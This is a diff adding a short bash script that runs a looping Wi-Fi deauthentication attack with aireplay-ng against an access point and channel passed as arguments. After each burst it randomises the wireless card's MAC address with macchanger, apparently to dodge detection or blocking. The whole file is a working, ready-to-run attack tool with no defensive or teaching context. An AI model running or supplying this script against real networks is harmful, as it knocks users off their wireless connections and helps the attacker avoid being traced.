@@ -1,0 +1,14 @@
+while true
+do
+	airmon-ng start wlan0
+	iwconfig wlan0mon channel $2
+	aireplay-ng -0 5 -a $1 wlan0mon
+	airmon-ng stop wlan0mon
+	ifconfig wlan0 down
+	macchanger -r wlan0 | grep "New MAC"
+	ifconfig wlan0 up 
+	iwconfig wlan0 | grep "Mode"
+	sleep 3
+	echo "Next iteration"
+
+done
